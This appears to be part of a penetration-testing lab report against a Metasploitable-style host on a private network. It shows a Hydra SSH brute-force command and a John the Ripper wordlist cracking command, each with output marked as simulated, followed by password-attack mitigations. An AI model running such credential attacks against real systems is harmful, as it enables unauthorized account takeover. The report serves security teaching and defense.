 Brute-Force SSH Login with Hydra

 An online brute-force attack was conducted against the SSH service (Port 22) to demonstrate the susceptibility to weak credentials.

Preparation: Simple users.txt and passwords.txt dictionary files were created (e.g., containing msfadmin, user, admin and password, 123456, msfadmin respectively).

hydra -L users.txt -P passwords.txt ssh://192.168.56.4 -t 4

# Simulated Hydra Output:
[22][ssh] host: 192.168.56.4   login: msfadmin   password: msfadmin
1 of 1 target successfully completed, 1 valid password found

Cracking Hashed Passwords with John the Ripper

john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Simulated John the Ripper Output:
msfadmin:(plaintext_password_found)
1 password hash cracked, 0 left

Mitigation for Password Attacks
Strong Password Policy: Implement and enforce a mandatory policy requiring passwords of significant length (e.g., >12 characters) and complexity (mix of uppercase, lowercase, numbers, symbols).

Account Lockout: Configure SSH and other login services to temporarily lock accounts after a defined number of failed login attempts.

Multi-Factor Authentication (MFA): Where possible, implement MFA to add an extra layer of security beyond just a password.

Key-Based Authentication: For SSH, prefer using secure SSH keys over password-based authentication.